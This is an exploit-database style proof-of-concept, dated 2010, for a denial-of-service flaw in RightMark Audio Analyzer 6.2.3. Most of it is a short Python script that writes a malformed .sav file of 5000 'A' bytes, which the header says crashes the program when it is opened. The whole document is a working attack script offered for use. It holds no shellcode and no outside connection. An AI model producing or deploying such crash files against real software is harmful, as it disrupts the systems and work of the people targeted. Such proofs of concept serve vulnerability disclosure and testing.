# Exploit Title: RightMark Audio Analyzer 6.2.3 (.sav , .sac) DoS
# Date: 12 / 8 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.topdownloads.net/software/rightmark-audio-analyzer_2_219034.html?hl=&ia=0
# Version: v6.2.3
# Tested on: Windows XP SP 2
# CVE : N / A
# Description : This is the latest version from the official website

#!/usr/bin/python

# Create the malicious .sav or .sac file and boom ! The program crashes ! DEADBEEF !
filename = "crash.sav"

junk = "\x41" * 5000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()